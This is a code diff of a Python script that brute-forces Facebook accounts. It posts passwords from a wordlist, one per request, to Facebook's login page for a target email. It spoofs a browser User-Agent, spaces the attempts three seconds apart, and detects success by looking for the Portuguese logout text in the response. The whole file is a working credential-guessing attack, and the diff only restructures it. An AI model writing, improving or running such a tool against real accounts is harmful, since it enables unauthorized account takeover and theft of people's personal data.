@@ -1,17 +1,27 @@
 import requests
-from os import getcwd, system
+from os import getcwd, mkdir
 from utils import get_element, convert_form_to_dict
+from terminal import cracking, finded_password
+from time import sleep
 
 settings = {
     "url": "https://www.facebook.com/login.php"
 }
 
 session = requests.Session()
+session.headers.update({
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36",
+})
 
 
 def getPage():
     res = session.get(settings["url"])
     return res.text
+
+
+def writeFile(name, content):
+    log = open(f"{getcwd()}/logs/{name}.html", "w")
+    log.write(content)
 
 
 def main():
@@ -20,38 +30,30 @@ def main():
     html = getPage()
     formEl = get_element(html, "form")
     data = convert_form_to_dict(formEl)
-    file = open(f"{getcwd()}/wordlist1.txt", "r")
+    data["email"] = email
 
-    custom_headers = {
-        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36",
-    }
-    session.headers.update(custom_headers)
+    file = open(f"{getcwd()}/data/wordlist1.txt", "r")
     while True:
 
         try:
             line = next(file)
             data["pass"] = line
-            data["email"] = email
             res = session.post(settings["url"], data=data)
-
+            content = res.text
             if saveLogs == "y":
-                log = open(f"{getcwd()}/logs/{line}.html", "w")
-                log.write(res.text)
+                try:
+                    writeFile(line, content)
+                except FileNotFoundError:
+                    mkdir(f"{getcwd()}/logs")
+                    writeFile(line, content)
 
-            if ("Terminar sessão" in res.text):
-                print("================================ SEARCHED ===================================")
-                print(f"Your password: {line}")
+            if ("Terminar sessão" in content or len(content) == 0):
+                finded_password(line)
                 break
 
-            system("clear")
-            print("""
-                === ===   === ===     =======     =========== ===         ============= =======   ====
-                ===    ===    ===   ===      ===  ===     === ===         ===       === ===  ===  ====
-                ===    ===    === ===         === ===     === ===         ===       === ===   === ====
-                ===           === ===  =====  === ===  ====== ===         ===       === ===    ======
-                ===           === ===         === ===     === =========== ============= ===
-            """)
-            print("...FORCING CRACk...")
+            cracking(line)
+
+            sleep(3)
         except StopIteration:
             print("SORRY ):")
             break
@@ -59,4 +61,7 @@ def main():
     file.close()
 
 
-main()
+try:
+    main()
+except KeyboardInterrupt:
+    print("\n\nBye :)")
